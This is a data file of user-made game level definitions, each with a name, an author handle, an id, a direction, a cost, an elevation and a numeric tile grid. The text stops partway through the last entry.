maps.push({name="Across and beneath",author="RobiBobi212",id="#1655127100",direction="forward",cost=425,elevation=9,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,2,2,0,0,0,5,5,5,85,5,85,5,85,5,5,5,77,1,0,0,5,5,0,0,0,5,5,85,5,85,5,85,5,85,5,5,77,1,0,0,5,5,0,0,0,95,95,1,1,1,1,1,1,1,105,105,1,1,0,5,5,5,5,0,0,5,5,5,6,7,8,9,10,11,45,45,11,95,31,45,31,31,45,31,0,5,5,5,6,7,8,9,10,11,45,45,11,95,31,45,31,31,45,31,0,1,1,1,1,1,1,1,1,1,105,105,1,1,0,5,5,5,5,30,0,1,1,1,1,1,1,1,1,1,95,95,1,1,77,1,5,5,1,29,0,1,84,84,77,84,77,84,84,84,84,84,77,1,24,1,95,95,1,28,0,1,84,84,77,84,77,84,5,5,5,5,0,1,1,1,5,5,1,27,0,1,84,84,77,84,77,84,84,84,84,84,77,1,0,1,5,5,1,26,0,1,24,24,24,17,17,5,5,5,5,5,0,1,0,1,5,5,5,5,1,1,1,1,1,1,1,1,1,0,5,5,0,1,0,1,5,5,5,5,1,14,14,13,12,3,5,5,1,0,5,5,0,1,1,1,96,96,1,1,1,14,14,77,11,5,5,5,1,0,5,5,0,0,0,0,5,5,0,0,1,14,14,77,10,5,5,95,96,5,5,5,5,5,5,5,5,5,0,0,1,14,14,77,9,5,5,95,96,5,5,5,0,0,0,0,5,97,0,0,1,14,14,77,8,5,5,95,96,5,5,5,5,5,5,5,5,5,0,0,1,95,95,1,7,5,5,5,1,0,5,5,0,0,0,0,5,5,0,0,1,2,2,1,6,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Among Us",author="mangaka7",id="#1655254358",direction="forward",cost=345,elevation=-5,map=[0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,115,115,1,0,0,0,0,0,0,0,0,0,0,1,115,115,115,115,115,1,115,115,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,115,115,1,1,1,1,1,1,0,0,1,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,1,0,1,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,1,1,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,1,1,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,1,1,115,115,115,115,10,10,10,10,115,115,115,115,115,1,1,1,1,1,1,1,115,115,115,10,65,65,71,71,10,115,115,115,115,1,0,0,0,0,0,1,115,115,115,10,65,65,71,71,10,115,115,115,115,1,0,0,0,0,0,1,115,115,115,10,65,65,71,71,10,115,115,115,115,1,1,1,1,1,1,1,115,115,115,10,65,65,71,71,10,115,115,115,115,1,115,115,115,115,1,1,115,115,115,10,65,65,71,71,10,115,115,115,115,1,115,115,115,115,1,0,1,115,115,10,65,65,71,71,10,115,115,115,115,115,115,115,115,115,1,0,0,1,115,10,65,65,71,71,10,115,115,115,115,115,115,115,115,115,1,0,0,0,1,10,65,65,71,71,10,1,1,1,1,1,1,1,1,1,1,0,0,0,0,10,65,65,71,71,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Warp Wrap",author="tilgep",id="#1655327529",direction="left",cost=217,elevation=-4,map=[0,0,0,0,0,1,1,1,1,1,1,1,0,0,2,2,0,0,0,0,137,15,15,15,15,15,15,1,134,134,0,1,0,0,39,39,0,1,1,1,137,15,15,15,15,15,15,1,19,19,0,1,0,0,39,39,0,1,0,1,0,0,0,0,0,15,15,1,19,19,0,1,0,0,39,39,0,1,0,1,1,1,1,1,0,15,15,1,19,19,0,1,0,0,39,39,0,1,1,1,0,0,0,1,0,15,15,1,19,19,0,1,0,0,39,39,0,0,0,0,0,0,0,0,0,15,15,1,19,19,0,1,0,0,39,39,39,39,39,131,2,15,15,15,15,15,15,1,19,19,0,1,0,0,39,39,39,39,39,131,2,15,15,15,15,15,15,1,19,19,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,19,19,0,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,1,19,19,19,19,19,19,0,0,0,0,0,0,1,1,1,1,1,1,1,1,19,19,19,19,19,19,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,19,19,0,0,0,0,0,0,132,40,40,40,40,40,40,0,1,0,0,0,19,19,19,19,19,19,19,136,132,40,40,40,40,40,40,0,1,0,0,0,19,19,19,19,19,19,19,136,0,0,0,0,0,40,40,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,133,133,0,1,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Jump n Strafe",author="fantasy",id="#1655487696",direction="forward",cost=456,elevation=0,map=[9,9,9,9,9,9,1,0,0,2,2,0,0,1,9,9,9,9,9,9,9,132,9,132,9,9,1,0,0,124,124,0,0,1,9,9,132,9,132,9,9,9,9,9,9,9,1,0,0,124,124,0,0,1,9,9,9,9,9,9,0,130,65,130,65,9,1,0,0,124,124,0,0,1,9,65,130,65,130,0,0,130,65,130,65,9,1,0,0,0,0,0,0,1,9,65,130,65,130,0,0,130,65,130,65,9,1,0,0,0,0,0,0,1,9,65,130,65,130,0,0,130,65,130,65,9,1,0,25,25,25,25,0,1,9,65,130,65,130,0,0,130,65,130,65,9,1,0,25,131,131,25,0,1,9,65,130,65,130,0,0,130,65,130,65,9,1,0,25,131,131,25,0,1,9,65,130,65,130,0,0,130,65,130,65,9,1,0,25,25,25,25,0,1,9,65,130,65,130,0,0,130,65,130,65,9,1,0,0,0,0,0,0,1,9,65,130,65,130,0,0,130,65,130,65,9,1,77,77,0,0,77,77,1,9,65,130,65,130,0,0,130,65,130,65,9,1,24,77,0,0,77,24,1,9,65,130,65,130,0,0,130,65,130,65,9,1,1,1,1,1,1,1,1,9,65,130,65,130,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,92,9,92,9,9,9,9,9,9,9,9,9,9,9,9,92,9,92,9,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,1,1,124,1,1,124,1,1,124,1,1,124,1,1,124,1,1,124,1,1,124,124,124,124,124,124,124,124,124,2,2,124,124,124,124,124,124,124,124,124]});
maps.push({name="Defend for the trigg",author="fantasy",id="#1655494386",direction="left",cost=300,elevation=5,map=[100,24,0,0,1,0,0,0,0,2,2,0,0,0,64,64,64,64,64,64,24,0,0,0,1,0,0,0,0,19,19,0,0,0,23,0,64,64,97,64,0,24,0,0,1,0,0,0,0,19,19,0,0,0,22,0,64,64,64,64,0,0,0,0,1,0,0,0,0,0,0,0,0,0,21,0,64,64,64,64,0,0,24,124,96,124,24,0,5,5,5,5,0,0,20,0,0,0,64,64,0,0,24,124,96,124,24,0,5,131,131,5,0,0,19,0,0,0,64,64,0,0,24,124,96,124,24,0,5,131,131,5,0,0,18,0,0,0,64,64,0,0,24,124,96,124,24,0,5,5,5,5,0,0,17,0,0,0,98,98,0,0,0,0,1,0,0,0,0,0,0,0,0,0,16,0,0,0,64,64,0,24,0,0,1,0,0,0,0,12,12,0,0,0,15,0,0,0,64,64,24,0,0,0,1,0,0,0,0,132,132,0,0,0,14,0,0,0,64,64,99,24,0,0,1,0,0,0,0,12,12,0,0,0,13,0,0,0,64,64,1,1,1,1,1,93,12,12,12,66,66,12,12,12,12,0,0,0,64,64,44,44,101,124,1,1,1,1,1,1,1,1,1,1,1,1,1,1,124,124,44,44,101,124,1,100,124,89,124,124,124,124,124,124,124,124,124,124,124,124,44,44,1,124,1,124,124,89,124,124,124,124,124,124,124,124,124,124,124,124,44,44,1,124,124,124,124,124,1,1,1,1,124,1,1,1,1,1,124,124,2,44,1,124,124,124,124,124,1,1,1,1,124,1,1,1,1,1,124,124,2,44,1,124,1,124,124,89,124,124,124,124,124,124,124,124,124,124,124,124,44,44,1,102,1,100,124,89,124,124,124,124,124,124,124,124,124,124,124,124]});
maps.push({name="CSS Telehop",author="fantasy",id="#1655497931",direction="right",cost=364,elevation=0,map=[2,2,0,0,5,0,0,0,12,12,0,0,0,0,0,0,0,0,24,100,19,19,0,5,131,5,0,12,12,133,12,0,24,65,124,124,124,0,24,24,94,19,0,5,131,5,0,12,132,133,12,0,24,65,124,124,124,0,24,93,19,19,0,0,5,0,0,0,12,12,0,0,0,0,0,3,124,0,0,0,96,96,1,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,96,96,1,0,0,0,24,0,0,24,15,0,0,0,0,5,5,5,0,0,19,19,1,0,0,0,24,24,24,24,15,0,0,0,0,5,136,5,0,0,19,19,1,0,0,0,24,1,1,1,15,1,1,0,0,5,5,137,0,0,19,19,1,97,24,24,24,1,15,15,15,15,1,0,0,135,135,135,0,0,19,19,1,1,1,1,1,1,15,134,134,15,1,0,0,135,44,135,0,0,19,19,1,131,5,0,24,99,24,24,24,24,1,0,0,44,44,44,0,0,87,19,1,5,1,1,1,1,1,1,1,1,1,1,1,1,1,44,0,0,19,19,1,1,90,19,19,19,87,19,91,91,19,19,19,19,1,102,0,0,90,19,1,1,19,19,19,19,19,19,91,91,19,19,19,19,1,44,0,0,19,19,1,1,19,19,1,1,1,1,1,1,1,1,19,87,103,44,0,0,19,19,1,1,19,19,101,101,19,19,19,19,19,1,19,87,103,44,0,0,19,19,1,1,19,19,101,101,19,19,19,19,19,1,19,19,1,1,1,1,19,19,1,1,1,1,1,1,1,1,1,1,19,1,19,19,19,19,19,2,98,98,19,19,19,19,19,19,19,19,19,90,19,1,19,104,19,19,19,2,98,98,19,19,19,19,87,19,19,19,19,19,19,1,1,1,1,1,1,1]});
maps.push({name="Strafe Madness",author="fantasy",id="#1655515510",direction="forward",cost=608,elevation=0,map=[97,14,1,0,0,0,0,0,1,2,2,1,0,0,0,0,0,1,14,102,14,14,1,0,0,0,0,0,1,14,14,1,0,0,0,0,0,1,98,14,1,14,1,1,1,1,1,1,1,135,135,1,1,1,1,1,1,1,14,1,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,1,135,14,94,135,135,135,135,135,135,135,135,135,135,135,135,94,14,135,1,1,135,93,14,135,135,135,135,135,135,135,135,135,135,135,135,14,93,135,1,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,1,135,135,135,135,135,135,135,135,14,14,135,135,135,135,135,135,135,135,1,1,135,135,135,135,135,135,135,135,103,103,135,135,135,135,135,135,135,135,1,1,135,135,135,135,135,135,14,103,14,100,103,14,135,135,135,135,135,135,1,1,135,135,135,135,135,135,14,103,100,14,103,14,135,135,135,135,135,135,1,1,135,135,135,135,135,135,135,135,103,103,135,135,135,135,135,135,135,135,1,1,135,135,135,135,135,135,135,135,14,14,135,135,135,135,135,135,135,135,1,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,1,135,93,14,135,135,135,135,135,135,135,135,135,135,135,135,14,93,135,1,1,135,14,94,135,135,135,135,135,135,135,135,135,135,135,135,94,14,135,1,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,1,14,1,1,1,1,1,1,1,135,135,1,1,1,1,1,1,1,14,1,14,96,1,0,0,0,0,0,1,14,14,1,0,0,0,0,0,1,101,14,99,14,1,0,0,0,0,0,1,2,2,1,0,0,0,0,0,1,14,104]});
maps.push({name="Low poly santa truth",author="fantasy",id="#1655838297",direction="right",cost=262,elevation=0,map=[93,9,9,9,0,0,0,9,85,93,9,0,0,77,0,0,2,2,0,0,85,1,1,9,29,29,29,9,1,1,9,0,77,24,77,0,9,9,0,0,9,1,1,9,29,29,29,9,1,1,9,0,0,77,0,0,9,9,0,0,9,9,9,9,0,0,0,9,9,9,9,0,0,0,0,0,29,29,0,0,0,29,29,0,0,77,0,0,29,29,0,0,0,77,0,0,29,29,0,0,0,29,94,0,77,24,77,0,94,29,0,0,77,24,77,0,29,94,0,0,0,29,29,0,0,77,0,0,29,29,0,0,0,77,0,0,29,29,0,0,9,9,9,9,0,0,0,9,9,9,9,0,0,0,0,9,9,9,9,0,9,1,1,9,0,0,0,9,1,1,9,29,85,29,29,9,1,1,9,0,9,1,1,9,0,0,0,9,1,1,9,29,29,29,29,9,1,1,9,0,9,9,9,9,0,0,0,9,9,9,9,0,0,0,0,93,9,9,9,0,0,29,29,0,0,77,0,0,0,0,0,0,77,0,0,0,0,0,0,0,0,29,29,0,77,24,77,0,0,0,0,77,24,77,0,0,0,0,0,0,0,29,29,0,0,77,0,0,0,0,0,0,77,0,0,0,0,0,0,0,9,9,9,9,0,0,0,9,9,9,9,0,0,0,9,9,9,9,0,0,9,1,1,9,29,29,29,9,1,1,9,29,29,85,9,1,1,9,29,2,9,1,1,9,29,29,29,9,1,1,9,29,29,29,9,1,1,9,29,2,93,85,9,9,0,0,0,85,9,9,9,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,24]});
maps.push({name="Get turnt",author="Luffaren",id="#1655850945",direction="left",cost=144,elevation=-9,map=[0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,25,25,25,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,25,100,25,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,25,0,0,0,0,0,0,0,0,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,0,0,0,0,0,0,0,25,0,0,0,0,0,0,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,4,11,10,10,10,10,0,0,0,0,0,0,0,25,0,0,0,24,24,24,24,24,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,24,1,94,93,24,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,8,8,8,8,0,0,0,0,0,0,5,5,5,5,5,5,5,6,7,8,8,8,8,8,0,0,0,0,0,0,2,5,5,5,5,5,5,6,7,8,8,8,8,8,0,0,0,0,0,0,2,5,5,5,5,5,5,6,7,8,8,8,8,0,0,0,0,0,0,0,5,5,5,5,5,5,5,6,7,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Boost Bonanza",author="Hichatu",id="#1655851483",direction="forward",cost=152,elevation=0,map=[5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,127,129,5,0,0,0,5,129,129,5,0,0,0,5,127,127,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,129,127,5,0,0,0,5,126,128,5,0,0,0,5,127,127,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,128,126,5,0,0,0,5,128,128,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Boost Bonanza 2",author="Hichatu",id="#1655852638",direction="forward",cost=340,elevation=19,map=[5,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,2,2,24,24,24,24,24,24,24,24,24]});
maps.push({name="Resistance is Futile",author="ZpLit",id="#1655875651",direction="forward",cost=201,elevation=-9,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,0,0,0,0,0,0,0,0,0,0,9,9,30,31,0,0,0,0,35,35,0,0,0,0,0,0,0,0,0,9,9,9,30,31,31,32,0,0,34,34,0,0,36,36,37,38,19,0,0,9,9,0,0,31,31,32,32,33,14,14,34,35,36,36,37,38,19,19,0,9,9,0,0,0,0,32,32,33,14,14,34,35,36,0,0,0,19,19,19,9,9,0,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,19,19,95,95,0,1,0,1,1,1,94,1,1,1,1,1,94,1,1,0,95,95,95,95,0,1,0,1,93,1,1,1,1,1,93,1,1,0,1,0,95,95,9,9,0,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,19,19,9,9,0,0,0,0,32,32,33,14,14,34,35,36,0,0,0,19,19,19,9,9,0,0,31,31,32,32,33,14,14,34,35,36,36,37,38,19,19,0,9,9,9,30,31,31,32,0,1,33,33,1,0,36,36,37,38,19,0,0,0,9,9,30,31,0,0,0,1,32,32,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,31,31,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,30,30,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,1,29,29,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0]});
maps.push({name="Casual Defense",author="fantasy",id="#1655917455",direction="right",cost=211,elevation=-12,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,17,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,17,17,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,17,90,1,0,1,17,17,90,90,17,17,17,17,17,17,17,17,17,90,17,17,17,1,0,1,17,17,17,17,17,17,17,17,90,17,17,17,17,17,17,17,17,1,0,1,17,17,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,67,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,67,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,17,0,67,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,67,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,67,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,90,0,0,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,17,17,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,1,90,17,17,17,17,17,90,17,17,17,90,17,17,17,0,0,66,5,2,1,17,17,17,17,17,17,17,17,17,90,17,17,17,17,0,0,66,5,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0]});
maps.push({name="Chill area",author="fantasy",id="#1655918785",direction="left",cost=261,elevation=7,map=[1,2,2,1,0,67,24,24,24,67,0,1,1,1,1,1,1,1,0,0,1,105,105,1,0,0,67,67,67,0,105,105,106,107,108,113,114,1,0,0,1,105,105,1,1,0,0,0,0,0,25,1,1,1,109,112,115,1,0,0,1,105,105,105,105,25,25,25,25,25,25,0,0,1,109,112,115,1,0,0,1,105,105,105,105,25,25,25,25,25,25,0,0,1,110,111,116,1,0,0,1,1,1,1,1,0,0,0,0,0,25,0,0,1,1,1,97,1,0,0,0,0,0,0,0,0,0,0,0,0,25,25,1,100,118,117,116,1,0,0,0,0,0,0,0,0,67,67,67,0,0,25,1,119,1,1,1,1,0,0,0,67,0,0,0,67,24,24,24,67,0,100,1,119,1,0,0,0,0,0,67,24,67,0,0,67,24,24,24,67,0,25,1,96,1,0,0,0,0,0,0,67,0,0,0,67,24,24,24,67,0,25,1,119,1,0,0,0,0,0,0,0,0,0,0,0,67,67,67,0,0,25,1,119,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,1,118,1,0,0,0,0,0,2,12,12,12,12,12,0,0,0,0,0,27,1,117,1,0,0,0,0,0,2,12,12,12,12,12,0,0,0,0,0,28,1,116,1,0,0,0,0,0,0,0,0,0,0,12,0,0,0,0,0,29,1,115,1,0,0,0,0,0,0,0,0,0,0,12,0,0,0,0,0,30,1,114,1,0,0,0,0,0,67,67,0,0,0,12,0,0,0,0,0,31,1,113,1,0,0,0,0,0,24,24,67,0,0,12,0,0,0,0,0,32,1,112,1,0,0,0,0,0,24,24,67,0,0,12,12,12,12,12,12,12,12,12,1,0,0,0,0,0]});
maps.push({name="Teleport Trouble",author="HIchatu",id="#1655925352",direction="right",cost=312,elevation=0,map=[1,1,1,1,1,0,1,24,24,2,2,24,24,1,0,0,0,0,0,0,1,24,24,24,1,0,1,24,24,24,24,24,24,1,0,0,0,0,0,0,1,132,24,133,1,0,1,24,24,131,131,24,24,1,0,0,0,0,0,0,1,24,24,24,1,0,1,24,24,24,24,24,24,1,0,0,0,0,0,0,1,1,1,1,1,0,1,1,1,1,1,1,1,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,1,24,24,24,1,0,0,0,0,0,0,1,1,1,1,1,1,132,24,133,1,134,24,136,1,0,0,0,0,0,0,1,24,24,24,24,1,24,24,24,1,24,24,24,1,0,0,0,0,0,0,1,24,24,24,24,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,1,24,139,24,2,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,24,24,24,2,1,24,24,24,1,24,24,24,1,24,24,24,1,0,0,1,24,24,24,24,1,132,24,133,1,134,24,136,1,137,24,138,1,0,0,1,24,24,24,24,1,24,24,24,1,24,24,24,1,24,24,24,1,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,24,24,24,1,24,24,24,1,24,24,24,1,0,0,0,0,0,0,0,1,132,24,133,1,134,24,136,1,137,24,138,1,0,0,0,0,0,0,0,1,24,24,24,1,24,24,24,1,24,24,24,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0]});
maps.push({name="Lava",author="fantasy",id="#1656028169",direction="left",cost=420,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,1,1,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,1,1,5,0,0,0,77,77,77,77,77,77,77,77,77,77,0,0,0,5,1,1,5,0,0,77,14,14,14,14,14,14,14,14,14,14,77,0,0,5,1,1,5,0,0,77,14,0,77,77,77,77,77,77,0,14,77,0,0,5,1,1,5,0,0,77,14,77,19,19,19,19,19,19,77,14,77,0,0,5,1,1,5,0,0,77,14,77,19,0,77,77,0,19,77,14,77,0,0,5,1,1,5,0,0,77,14,77,19,77,24,24,77,19,77,14,77,0,0,5,1,1,5,0,0,77,14,77,19,77,24,24,77,19,77,14,77,0,0,5,1,1,5,0,0,77,14,77,19,0,77,77,0,19,77,14,77,0,0,5,1,1,5,0,0,77,14,77,19,19,19,19,19,19,77,14,77,0,0,5,1,1,5,0,0,77,14,0,77,77,77,77,77,77,0,14,77,0,0,5,1,1,5,0,0,77,14,14,14,14,14,14,14,14,14,14,77,0,0,5,1,1,5,0,0,0,77,77,77,77,77,77,77,77,77,77,0,0,0,5,1,1,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,1,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,1,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="SnK Wall Maria",author="fantasy",id="#1656030055",direction="forward",cost=548,elevation=19,map=[5,5,10,10,5,5,5,5,5,2,2,5,5,5,5,5,10,10,5,5,5,10,94,45,5,5,5,10,10,5,5,10,10,5,5,5,45,94,10,5,5,10,45,45,5,5,10,94,45,5,5,45,94,10,5,5,45,45,10,5,5,16,50,50,5,5,10,45,45,5,5,45,45,10,5,5,50,50,16,5,5,16,93,50,3,5,16,50,50,5,5,50,50,16,5,3,50,93,16,5,24,5,16,16,5,5,16,93,50,3,3,50,93,16,5,5,16,16,5,24,100,24,5,5,5,5,5,16,16,5,5,16,16,5,5,5,5,5,24,100,5,24,24,5,5,5,5,5,5,5,5,5,5,5,5,5,5,24,24,5,5,3,24,24,5,5,5,5,5,5,5,5,5,5,5,5,24,24,3,5,5,5,5,24,24,5,5,5,3,5,5,3,5,5,5,24,24,5,5,5,5,77,5,5,24,24,24,24,24,24,24,24,24,24,24,24,5,5,77,5,5,19,77,5,76,92,76,5,5,5,5,5,5,76,92,76,5,77,19,76,5,76,5,5,76,76,76,5,5,5,77,15,5,76,76,76,5,5,5,5,3,5,76,8,76,76,76,5,77,5,5,5,5,76,76,76,5,76,5,3,24,5,5,5,76,76,76,5,22,77,5,77,8,76,76,76,5,5,5,24,24,24,77,5,76,76,76,5,77,5,5,16,5,76,76,76,5,77,24,24,5,24,24,5,76,76,76,5,5,5,76,5,5,76,76,76,5,24,24,5,5,5,24,24,76,76,76,5,76,5,5,76,5,76,76,76,24,24,5,5,5,66,5,24,24,76,76,5,24,24,24,24,5,76,76,24,24,5,66,5,100,5,5,3,24,24,24,24,24,2,2,24,24,24,24,24,3,5,5,100]});
maps.push({name="Great walls",author="Luffaren",id="#1656088838",direction="left",cost=204,elevation=-5,map=[0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,65,65,14,0,0,0,67,0,0,0,0,0,0,0,0,0,0,0,0,14,65,65,14,0,0,20,20,20,0,0,0,0,0,0,0,0,0,0,0,89,65,65,14,0,67,20,100,20,67,0,0,0,0,0,0,0,0,0,0,14,65,65,14,0,0,20,20,20,0,0,0,0,0,0,0,0,0,0,0,14,65,65,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,9,9,9,0,0,0,0,0,0,0,14,14,89,14,0,0,0,0,0,0,2,9,9,9,9,9,10,11,12,13,14,14,14,